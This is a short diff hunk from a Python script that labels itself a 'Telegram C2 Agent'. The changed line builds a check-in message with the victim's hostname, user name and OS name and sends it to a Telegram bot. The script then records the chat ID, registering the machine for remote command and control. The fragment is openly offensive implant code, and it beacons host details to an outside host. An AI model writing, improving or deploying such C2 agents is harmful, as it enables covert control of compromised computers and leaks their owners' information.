@@ -54,7 +54,7 @@ print("[*] Telegram C2 Agent starting...")
 print("[*] Bot: @" + me["result"]["username"])
 
 # Get our chat ID by sending a message
-msg = tg("sendMessage", {{"chat_id": 0, "text": "CHECKIN:{host}|{user}|{os_name}"}})
+msg = tg("sendMessage", {{"chat_id": 0, "text": "CHECKIN:" + hostname + "|" + user + "|" + os_name}})
 if msg and msg.get("ok"):
     CHAT_ID = msg["result"]["chat"]["id"]
     print("[+] Registered. Chat ID: " + str(CHAT_ID))
